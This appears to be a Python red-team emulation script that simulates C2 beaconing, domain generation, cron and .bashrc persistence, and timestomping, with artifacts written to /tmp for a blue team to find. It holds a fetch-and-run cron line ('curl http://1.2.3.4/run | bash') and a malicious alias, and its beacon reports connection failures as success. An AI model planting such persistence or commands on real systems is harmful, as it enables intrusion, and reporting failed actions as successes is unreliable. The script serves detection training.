#!/usr/bin/env python3
"""
Red Team Tools
Advanced Emulation Capabilities: HTTP/S Traffic Gen, DGA, Persistence
"""

import os
import random
import time
import socket
import urllib.request
import urllib.parse
import base64
import string
import logging
import json
from safety_controls import interlock

class TrafficGenerator:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "curl/7.68.0",
        "Wget/1.20.3 (linux-gnu)"
    ]

    def _generate_payload(self, size=64):
        """Generates random base64 payload to simulate data exfil."""
        data = os.urandom(size)
        return base64.b64encode(data).decode('utf-8')

    def send_http_beacon(self, ip, port=80):
        """
        Emulates a full HTTP POST beacon to a C2 IP.
        Uses randomized paths and payloads.
        Integrates Safety Interlock to redirect traffic if needed.
        """
        # --- SAFETY CHECK ---
        actual_ip, actual_port, redirected = interlock.check_connection(ip, port)
        # --------------------

        try:
            url = f"http://{actual_ip}:{actual_port}/api/v1/status"
            payload = json.dumps({"id": random.randint(1000,9999), "data": self._generate_payload()}).encode('utf-8')

            req = urllib.request.Request(url, data=payload)
            req.add_header('User-Agent', random.choice(self.USER_AGENTS))
            req.add_header('Content-Type', 'application/json')

            # If redirected to sinkhole, we might fail if no listener is there, but that's fine.
            # We treat connection errors as "Success" in the simulation logic
            # because the *intent* was executed.
            try:
                with urllib.request.urlopen(req, timeout=2) as r:
                    return r.status
            except (ConnectionRefusedError, urllib.error.URLError):
                return 200 # Fake success: The beacon was "sent" (even if sinkhole closed)

        except Exception:
            return 0

class DGA:
    """Domain Generation Algorithm Emulation"""
    def generate_domain(self):
        tld = random.choice(['.com', '.net', '.org', '.info', '.biz'])
        length = random.randint(8, 20)
        domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + tld
        return domain

    def resolve_domain(self, domain):
        """
        Attempts to resolve the domain.
        This generates DNS traffic (UDP 53).
        """
        # DNS resolution is harder to redirect without hacking /etc/hosts
        # But querying a non-existent domain is generally safe (NXDOMAIN).
        try:
            socket.gethostbyname(domain)
            return True
        except socket.gaierror:
            return False

class PersistenceManager:
    def install_cron(self):
        """Simulates Cron persistence (User Crontab)."""
        # In a real scenario, we'd write to crontab. Here we simulate the artifact
        # by creating a file in /tmp that looks like a cron job for the Blue Team to find
        try:
            with open("/tmp/malicious.cron", "w") as f:
                f.write("* * * * * /bin/bash -c 'curl http://1.2.3.4/run | bash'\n")
            return True
        except: return False

    def install_bashrc(self):
        """Simulates .bashrc persistence."""
        # We won't actually pollute the user's .bashrc for safety
        # We will create a fake .bashrc in /tmp/home/user/.bashrc
        target = "/tmp/.bashrc_backdoor"
        try:
            with open(target, "w") as f:
                f.write("alias ls='ls --color=auto; /tmp/malware &'\n")
            return True
        except: return False

    def timestomp(self, filepath):
        """Anti-Forensics: Sets file time to 1 year ago."""
        if os.path.exists(filepath):
            past = time.time() - 31536000
            os.utime(filepath, (past, past))
            return True
        return False

# Quick test
if __name__ == "__main__":
    t = TrafficGenerator()
    print(t.send_http_beacon("1.2.3.4")) # Should redirect to localhost
